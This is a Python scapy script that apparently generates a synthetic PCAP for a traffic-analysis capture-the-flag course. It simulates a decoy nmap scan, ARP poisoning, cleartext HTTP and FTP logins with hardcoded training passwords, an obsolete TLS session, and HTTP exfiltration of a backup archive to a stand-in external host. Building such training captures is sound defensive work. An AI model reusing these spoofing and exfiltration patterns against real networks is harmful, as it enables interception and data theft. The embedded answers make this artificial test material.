#!/usr/bin/env python3
"""
N6a - Traffic Analysis CTF1  :  capture generator
Orion Retail Ltd / KYPO-CRCZP training node

Produces a deterministic PCAP containing every artefact the four training
levels depend on.  Re-run after editing the CONFIG block to change flags,
credentials or addressing; nothing else in the file needs touching.

    pip install scapy
    python3 generate_pcap.py
    editcap -F pcapng orion-internal.pcap orion-internal.pcapng
"""

import base64
import datetime
import random
import struct

from scapy.all import (
    ARP, DNS, DNSQR, DNSRR, Ether, IP, NTPHeader, Raw, TCP, UDP, wrpcap,
)

random.seed(20260904)          # deterministic output across runs

# ----------------------------------------------------------------------------
# CONFIG
# ----------------------------------------------------------------------------
OUT             = "orion-internal.pcap"
ZIP_PATH        = "payload/site-backup.zip"
CERT_PATH       = "server_cert.der"

# MACs use real vendor OUIs and bear no relationship to the IP addresses,
# so the addressing itself gives nothing away.
GW_IP,  GW_MAC  = "172.20.30.1",  "00:1b:0d:5e:11:74"   # Cisco
SRV_IP, SRV_MAC = "172.20.30.10", "00:14:22:7c:3a:19"   # Dell - capture point
WS1_IP, WS1_MAC = "172.20.30.25", "18:66:da:41:9e:6b"   # admin workstation
WS2_IP, WS2_MAC = "172.20.30.31", "18:66:da:0c:57:e8"   # sales workstation
WS3_IP, WS3_MAC = "172.20.30.13", "3c:d9:2b:8f:15:c2"
WS4_IP, WS4_MAC = "172.20.30.77", "3c:d9:2b:44:6a:9d"
WS5_IP, WS5_MAC = "172.20.30.91", "18:66:da:b3:27:5f"
ATK_IP, ATK_MAC = "172.20.30.66", "a0:36:9f:2e:83:51"   # Intel - the attacker
EXF_IP          = "203.0.113.45"                       # RFC 5737 TEST-NET-3

HTTP_USER, HTTP_PASS = "webadmin", "Or10n_W3b_2024!"
FTP_USER,  FTP_PASS  = "backupsvc", "Ba3kup!Or10n#24"
ARCHIVE              = "site-backup.zip"

# 2026-09-04 (Friday) 10:12:00 UTC
T0 = datetime.datetime(2026, 9, 4, 10, 12, 0,
                       tzinfo=datetime.timezone.utc).timestamp()

MSS = 1460
pkts = []


def emit(pkt, t):
    pkt.time = t
    pkts.append(pkt)


def jitter(lo=0.0004, hi=0.0035):
    return random.uniform(lo, hi)


# ----------------------------------------------------------------------------
# TCP conversation helper
# ----------------------------------------------------------------------------
class Stream:
    """Minimal but sequence-correct TCP conversation."""

    def __init__(self, cmac, cip, cport, smac, sip, sport, t, cttl=64, sttl=64):
        self.cmac, self.cip, self.cport = cmac, cip, cport
        self.smac, self.sip, self.sport = smac, sip, sport
        self.cseq = random.randint(100000, 4000000000)
        self.sseq = random.randint(100000, 4000000000)
        self.cttl, self.sttl = cttl, sttl
        self.t = t

    def _c(self, flags, payload=b"", win=64240):
        p = (Ether(src=self.cmac, dst=self.smac) /
             IP(src=self.cip, dst=self.sip, ttl=self.cttl) /
             TCP(sport=self.cport, dport=self.sport, flags=flags,
                 seq=self.cseq, ack=self.sseq, window=win))
        if payload:
            p = p / Raw(load=payload)
        self.t += jitter()
        emit(p, self.t)

    def _s(self, flags, payload=b"", win=65535):
        p = (Ether(src=self.smac, dst=self.cmac) /
             IP(src=self.sip, dst=self.cip, ttl=self.sttl) /
             TCP(sport=self.sport, dport=self.cport, flags=flags,
                 seq=self.sseq, ack=self.cseq, window=win))
        if payload:
            p = p / Raw(load=payload)
        self.t += jitter()
        emit(p, self.t)

    def handshake(self):
        p = (Ether(src=self.cmac, dst=self.smac) /
             IP(src=self.cip, dst=self.sip, ttl=self.cttl) /
             TCP(sport=self.cport, dport=self.sport, flags="S",
                 seq=self.cseq, window=64240))
        self.t += jitter()
        emit(p, self.t)
        self.cseq += 1
        p = (Ether(src=self.smac, dst=self.cmac) /
             IP(src=self.sip, dst=self.cip, ttl=self.sttl) /
             TCP(sport=self.sport, dport=self.cport, flags="SA",
                 seq=self.sseq, ack=self.cseq, window=65535))
        self.t += jitter(0.0002, 0.0008)
        emit(p, self.t)
        self.sseq += 1
        self._c("A")

    def send(self, data, from_client=True, ack_every=True):
        """Push payload, segmenting at MSS, with periodic ACKs back."""
        view = memoryview(data)
        off = 0
        while off < len(view):
            chunk = bytes(view[off:off + MSS])
            off += MSS
            last = off >= len(view)
            if from_client:
                self._c("PA" if last else "A", chunk)
                self.cseq += len(chunk)
                if ack_every and (last or (off // MSS) % 2 == 0):
                    self._s("A")
            else:
                self._s("PA" if last else "A", chunk)
                self.sseq += len(chunk)
                if ack_every and (last or (off // MSS) % 2 == 0):
                    self._c("A")

    def c2s(self, data):
        self.send(data if isinstance(data, bytes) else data.encode(), True)

    def s2c(self, data):
        self.send(data if isinstance(data, bytes) else data.encode(), False)

    def close(self, by_client=True):
        if by_client:
            self._c("FA"); self.cseq += 1
            self._s("FA"); self.sseq += 1
            self._c("A")
        else:
            self._s("FA"); self.sseq += 1
            self._c("FA"); self.cseq += 1
            self._s("A")


# ----------------------------------------------------------------------------
# BLOCK 1 - baseline noise
# ----------------------------------------------------------------------------
def block_baseline(t):
    hosts = [(WS1_IP, WS1_MAC), (WS2_IP, WS2_MAC), (WS3_IP, WS3_MAC),
             (WS4_IP, WS4_MAC), (WS5_IP, WS5_MAC)]
    names = ["updates.orion.local", "intranet.orion.local", "www.debian.org",
             "pool.ntp.org", "packages.ubuntu.com", "mail.orion.local"]

    # legitimate ARP - establishes the true MAC of every host
    for ip, mac in hosts:
        emit(Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
             ARP(op=1, hwsrc=mac, psrc=ip, pdst=GW_IP), t); t += 0.11
        emit(Ether(src=GW_MAC, dst=mac) /
             ARP(op=2, hwsrc=GW_MAC, psrc=GW_IP, hwdst=mac, pdst=ip), t)
        t += 0.32

    for i in range(14):
        ip, mac = hosts[i % len(hosts)]
        qname = names[i % len(names)]
        txid = random.randint(1, 65535)
        emit(Ether(src=mac, dst=GW_MAC) / IP(src=ip, dst=GW_IP) /
             UDP(sport=random.randint(35000, 60000), dport=53) /
             DNS(id=txid, rd=1, qd=DNSQR(qname=qname)), t)
        t += 0.02
        emit(Ether(src=GW_MAC, dst=mac) / IP(src=GW_IP, dst=ip) /
             UDP(sport=53, dport=53) /
             DNS(id=txid, qr=1, rd=1, ra=1, qd=DNSQR(qname=qname),
                 an=DNSRR(rrname=qname, ttl=300, rdata="172.20.30.10")), t)
        t += 1.9

    # NTP
    for ip, mac in hosts[:3]:
        emit(Ether(src=mac, dst=GW_MAC) / IP(src=ip, dst=GW_IP) /
             UDP(sport=123, dport=123) / NTPHeader(version=4, mode=3), t)
        t += 0.05
        emit(Ether(src=GW_MAC, dst=mac) / IP(src=GW_IP, dst=ip) /
             UDP(sport=123, dport=123) / NTPHeader(version=4, mode=4), t)
        t += 0.9

    # a couple of ordinary intranet page loads
    for ip, mac, path in [(WS2_IP, WS2_MAC, "/index.html"),
                          (WS4_IP, WS4_MAC, "/stock/list.html")]:
        s = Stream(mac, ip, random.randint(40000, 60000), SRV_MAC, SRV_IP, 80, t)
        s.handshake()
        s.c2s(f"GET {path} HTTP/1.1\r\nHost: intranet.orion.local\r\n"
              f"User-Agent: Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0\r\n"
              f"Accept: text/html\r\nConnection: keep-alive\r\n\r\n")
        body = ("<html><head><title>Orion Intranet</title></head>"
                "<body><h1>Orion Retail Ltd</h1><p>Internal use only.</p>"
                "</body></html>")
        s.s2c(f"HTTP/1.1 200 OK\r\nServer: Apache/2.4.41 (Ubuntu)\r\n"
              f"Content-Type: text/html\r\nContent-Length: {len(body)}\r\n"
              f"Connection: keep-alive\r\n\r\n{body}")
        s.close()
        t = s.t + 1.4
    return t


# ----------------------------------------------------------------------------
# BLOCK 2 - nmap decoy scan (-D) + fragmented probes (-f)
# LEVEL 1 evidence: every forged source shares the attacker's Ethernet source
# address, and only the real host follows up with a full handshake.
# ----------------------------------------------------------------------------
def block_scan(t):
    sources = [(WS3_IP, WS3_MAC), (WS2_IP, WS2_MAC), (ATK_IP, ATK_MAC),
               (WS4_IP, WS4_MAC), (WS5_IP, WS5_MAC)]
    ports_open   = [21, 22, 80, 8080, 8443]
    ports_closed = [23, 25, 139, 445, 3306, 5900]
    allports = ports_open + ports_closed
    random.shuffle(allports)

    for port in allports:
        for src_ip, real_mac in sources:
            sp = random.randint(35000, 65000)
            seq = random.randint(1, 4000000000)
            # forged frames all leave the attacker's NIC
            emit(Ether(src=ATK_MAC, dst=SRV_MAC) /
                 IP(src=src_ip, dst=SRV_IP, ttl=54, id=random.randint(1, 65535)) /
                 TCP(sport=sp, dport=port, flags="S", seq=seq, window=1024), t)
            t += 0.004
            if port in ports_open:
                emit(Ether(src=SRV_MAC, dst=real_mac) /
                     IP(src=SRV_IP, dst=src_ip, ttl=64) /
                     TCP(sport=port, dport=sp, flags="SA",
                         seq=random.randint(1, 4000000000), ack=seq + 1,
                         window=65535), t)
                t += 0.002
                # only the genuine scanner tears the half-open connection down
                if src_ip == ATK_IP:
                    emit(Ether(src=ATK_MAC, dst=SRV_MAC) /
                         IP(src=ATK_IP, dst=SRV_IP, ttl=54) /
                         TCP(sport=sp, dport=port, flags="R", seq=seq + 1,
                             window=0), t)
                    t += 0.002
            else:
                emit(Ether(src=SRV_MAC, dst=real_mac) /
                     IP(src=SRV_IP, dst=src_ip, ttl=64) /
                     TCP(sport=port, dport=sp, flags="RA", seq=0, ack=seq + 1,
                         window=0), t)
                t += 0.002
        t += 0.05

    # nmap -f : TCP header split across 8-byte IP fragments
    t += 1.2
    for port in (80, 443, 8443):
        tcp_bytes = bytes(TCP(sport=random.randint(40000, 60000), dport=port,
                              flags="S", seq=random.randint(1, 4000000000),
                              window=1024))
        ipid = random.randint(1, 65535)
        for i in range(0, len(tcp_bytes), 8):
            frag = tcp_bytes[i:i + 8]
            more = 1 if i + 8 < len(tcp_bytes) else 0
            emit(Ether(src=ATK_MAC, dst=SRV_MAC) /
                 IP(src=ATK_IP, dst=SRV_IP, ttl=54, id=ipid, proto=6,
                    flags=("MF" if more else 0), frag=i // 8) /
                 Raw(load=frag), t)
            t += 0.003
        t += 0.4
    return t + 2.0


# ----------------------------------------------------------------------------
# BLOCK 3 - ARP poisoning  (LEVEL 1 evidence, T1557)
# ----------------------------------------------------------------------------
def block_arp(t):
    for _ in range(4):
        for victim_ip, victim_mac in [(WS1_IP, WS1_MAC), (SRV_IP, SRV_MAC)]:
            # attacker claims to be the gateway
            emit(Ether(src=ATK_MAC, dst=victim_mac) /
                 ARP(op=2, hwsrc=ATK_MAC, psrc=GW_IP,
                     hwdst=victim_mac, pdst=victim_ip), t)
            t += 0.08
        # and claims to be the server, towards the admin workstation
        emit(Ether(src=ATK_MAC, dst=WS1_MAC) /
             ARP(op=2, hwsrc=ATK_MAC, psrc=SRV_IP,
                 hwdst=WS1_MAC, pdst=WS1_IP), t)
        t += 0.09
        # gratuitous broadcast, triggers "duplicate IP address detected"
        emit(Ether(src=ATK_MAC, dst="ff:ff:ff:ff:ff:ff") /
             ARP(op=2, hwsrc=ATK_MAC, psrc=GW_IP,
                 hwdst="00:00:00:00:00:00", pdst=GW_IP), t)
        t += 1.6
    return t + 1.0


# ----------------------------------------------------------------------------
# BLOCK 4 - HTTP Basic auth to the admin panel (LEVEL 2, T1040)
# ----------------------------------------------------------------------------
def block_http_admin(t):
    cred = base64.b64encode(f"{HTTP_USER}:{HTTP_PASS}".encode()).decode()
    s = Stream(WS1_MAC, WS1_IP, 51544, SRV_MAC, SRV_IP, 8080, t)
    s.handshake()

    s.c2s(f"GET /admin/ HTTP/1.1\r\nHost: {SRV_IP}:8080\r\n"
          f"User-Agent: Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0\r\n"
          f"Accept: text/html,application/xhtml+xml\r\n"
          f"Connection: keep-alive\r\n\r\n")
    body = "<html><body><h1>401 Unauthorized</h1></body></html>"
    s.s2c(f"HTTP/1.1 401 Unauthorized\r\nServer: Apache/2.4.41 (Ubuntu)\r\n"
          f"WWW-Authenticate: Basic realm=\"Orion Admin Panel\"\r\n"
          f"Content-Type: text/html\r\nContent-Length: {len(body)}\r\n\r\n{body}")

    s.c2s(f"GET /admin/ HTTP/1.1\r\nHost: {SRV_IP}:8080\r\n"
          f"Authorization: Basic {cred}\r\n"
          f"User-Agent: Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0\r\n"
          f"Accept: text/html,application/xhtml+xml\r\n"
          f"Connection: keep-alive\r\n\r\n")
    dash = ("<html><head><title>Orion Admin Panel</title></head><body>"
            "<h1>Dashboard</h1><ul><li>Users: 24</li><li>Orders today: 118</li>"
            "<li>Backup job: OK (site-backup.zip)</li></ul>"
            "<a href=\"/admin/settings.php\">Settings</a></body></html>")
    s.s2c(f"HTTP/1.1 200 OK\r\nServer: Apache/2.4.41 (Ubuntu)\r\n"
          f"Set-Cookie: PHPSESSID=b1f4c2a90d7e4411; path=/\r\n"
          f"Content-Type: text/html\r\nContent-Length: {len(dash)}\r\n\r\n{dash}")

    s.c2s(f"GET /admin/settings.php HTTP/1.1\r\nHost: {SRV_IP}:8080\r\n"
          f"Authorization: Basic {cred}\r\n"
          f"Cookie: PHPSESSID=b1f4c2a90d7e4411\r\n"
          f"User-Agent: Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0\r\n\r\n")
    st = ("<html><body><h1>Settings</h1><form method=\"post\">"
          "<input name=\"ftp_host\" value=\"" + SRV_IP + "\">"
          "<input name=\"ftp_user\" value=\"backupsvc\">"
          "</form></body></html>")
    s.s2c(f"HTTP/1.1 200 OK\r\nServer: Apache/2.4.41 (Ubuntu)\r\n"
          f"Content-Type: text/html\r\nContent-Length: {len(st)}\r\n\r\n{st}")
    s.close()
    return s.t + 2.5


# ----------------------------------------------------------------------------
# BLOCK 5 - cleartext FTP + file transfer (LEVELS 2 and 4)
# ----------------------------------------------------------------------------
def block_ftp(t, zip_bytes):
    dport_hi, dport_lo = 197, 42            # 197*256+42 = 50474
    data_port = dport_hi * 256 + dport_lo

    c = Stream(WS1_MAC, WS1_IP, 44318, SRV_MAC, SRV_IP, 21, t)
    c.handshake()
    c.s2c("220 (vsFTPd 3.0.3)\r\n")
    c.c2s(f"USER {FTP_USER}\r\n")
    c.s2c("331 Please specify the password.\r\n")
    c.c2s(f"PASS {FTP_PASS}\r\n")
    c.s2c("230 Login successful.\r\n")
    c.c2s("SYST\r\n")
    c.s2c("215 UNIX Type: L8\r\n")
    c.c2s("TYPE I\r\n")
    c.s2c("200 Switching to Binary mode.\r\n")
    c.c2s("SIZE site-backup.zip\r\n")
    c.s2c(f"213 {len(zip_bytes)}\r\n")
    c.c2s("PASV\r\n")
    pasv_host = SRV_IP.replace(".", ",")
    c.s2c(f"227 Entering Passive Mode ({pasv_host},{dport_hi},{dport_lo}).\r\n")
    c.c2s(f"RETR {ARCHIVE}\r\n")
    c.s2c(f"150 Opening BINARY mode data connection for {ARCHIVE} "
          f"({len(zip_bytes)} bytes).\r\n")

    d = Stream(WS1_MAC, WS1_IP, 44320, SRV_MAC, SRV_IP, data_port, c.t + 0.01)
    d.handshake()
    d.s2c(zip_bytes)
    d.close(by_client=False)

    c.t = d.t + 0.02
    c.s2c("226 Transfer complete.\r\n")
    c.c2s("QUIT\r\n")
    c.s2c("221 Goodbye.\r\n")
    c.close()
    return c.t + 2.0


# ----------------------------------------------------------------------------
# BLOCK 6 - obsolete TLS on 8443 (LEVEL 3, T1071)
# ----------------------------------------------------------------------------
def tls_record(ctype, version, payload):
    return struct.pack("!BHH", ctype, version, len(payload)) + payload


def hs_msg(htype, payload):
    return struct.pack("!B", htype) + len(payload).to_bytes(3, "big") + payload


def build_client_hello():
    rnd = bytes(random.getrandbits(8) for _ in range(32))
    suites = [0xC02F, 0xC030, 0xC02B, 0xC02C, 0x009C, 0x009D,
              0xC013, 0xC014, 0x002F, 0x0035, 0x000A, 0x0005]
    body = struct.pack("!H", 0x0303) + rnd + b"\x00"
    body += struct.pack("!H", len(suites) * 2)
    for s in suites:
        body += struct.pack("!H", s)
    body += b"\x01\x00"                                   # compression: null
    host = b"srv-web01.orion.local"
    sni = (struct.pack("!H", len(host) + 3) + b"\x00" +
           struct.pack("!H", len(host)) + host)
    ext = struct.pack("!HH", 0x0000, len(sni)) + sni
    ext += struct.pack("!HH", 0x000b, 2) + b"\x01\x00"     # ec_point_formats
    ext += struct.pack("!HH", 0x000a, 6) + b"\x00\x04\x00\x17\x00\x18"
    ext += struct.pack("!HH", 0x000d, 8) + b"\x00\x06\x04\x01\x02\x01\x05\x01"
    body += struct.pack("!H", len(ext)) + ext
    return tls_record(0x16, 0x0301, hs_msg(0x01, body))


def build_server_flight(cert_der):
    rnd = bytes(random.getrandbits(8) for _ in range(32))
    sid = bytes(random.getrandbits(8) for _ in range(32))
    # TLS 1.0 + TLS_RSA_WITH_RC4_128_SHA (0x0005) + null compression
    sh = (struct.pack("!H", 0x0301) + rnd +
          bytes([len(sid)]) + sid +
          struct.pack("!H", 0x0005) + b"\x00")
    certs = len(cert_der).to_bytes(3, "big") + cert_der
    cert_msg = len(certs).to_bytes(3, "big") + certs
    flight = (hs_msg(0x02, sh) + hs_msg(0x0b, cert_msg) + hs_msg(0x0e, b""))
    return tls_record(0x16, 0x0301, flight)


def block_tls(t, cert_der):
    s = Stream(ATK_MAC, ATK_IP, 39284, SRV_MAC, SRV_IP, 8443, t, cttl=54)
    s.handshake()
    s.c2s(build_client_hello())
    s.s2c(build_server_flight(cert_der))

    cke_body = bytes(random.getrandbits(8) for _ in range(128))
    cke = tls_record(0x16, 0x0301, hs_msg(0x10, struct.pack("!H", 128) + cke_body))
    ccs = tls_record(0x14, 0x0301, b"\x01")
    fin = tls_record(0x16, 0x0301, bytes(random.getrandbits(8) for _ in range(36)))
    s.c2s(cke + ccs + fin)
    s.s2c(ccs + tls_record(0x16, 0x0301,
                           bytes(random.getrandbits(8) for _ in range(36))))
    for n in (312, 1180, 604):
        s.c2s(tls_record(0x17, 0x0301,
                         bytes(random.getrandbits(8) for _ in range(200))))
        s.s2c(tls_record(0x17, 0x0301,
                         bytes(random.getrandbits(8) for _ in range(n))))
    s.close()
    return s.t + 2.0


# ----------------------------------------------------------------------------
# BLOCK 7 - exfiltration over HTTP (walkthrough material, T1041)
# ----------------------------------------------------------------------------
def block_exfil(t, zip_bytes):
    b64 = base64.b64encode(zip_bytes).decode()
    n = 4
    size = len(b64) // n + 1
    chunks = [b64[i:i + size] for i in range(0, len(b64), size)]
    for idx, ch in enumerate(chunks, 1):
        s = Stream(ATK_MAC, ATK_IP, 40100 + idx, GW_MAC, EXF_IP, 80, t, cttl=64)
        s.handshake()
        body = f"id=ORN&seq={idx}of{len(chunks)}&data={ch}"
        s.c2s(f"POST /upload.php HTTP/1.1\r\nHost: cdn-static-eu.example.net\r\n"
              f"User-Agent: curl/7.81.0\r\nAccept: */*\r\n"
              f"Content-Type: application/x-www-form-urlencoded\r\n"
              f"Content-Length: {len(body)}\r\n\r\n{body}")
        s.s2c("HTTP/1.1 200 OK\r\nServer: nginx/1.18.0\r\n"
              "Content-Type: text/plain\r\nContent-Length: 3\r\n\r\nOK\n")
        s.close()
        t = s.t + 0.7
    return t


# ----------------------------------------------------------------------------
def main():
    zip_bytes = open(ZIP_PATH, "rb").read()
    cert_der = open(CERT_PATH, "rb").read()

    t = T0
    t = block_baseline(t)
    t = block_scan(t + 4.0)
    t = block_arp(t + 3.0)
    t = block_http_admin(t + 5.0)
    t = block_ftp(t + 4.0, zip_bytes)
    t = block_tls(t + 6.0, cert_der)
    t = block_exfil(t + 5.0, zip_bytes)

    pkts.sort(key=lambda p: p.time)
    wrpcap(OUT, pkts)
    span = pkts[-1].time - pkts[0].time
    print(f"wrote {OUT}: {len(pkts)} packets, {span:.1f}s span")


if __name__ == "__main__":
    main()
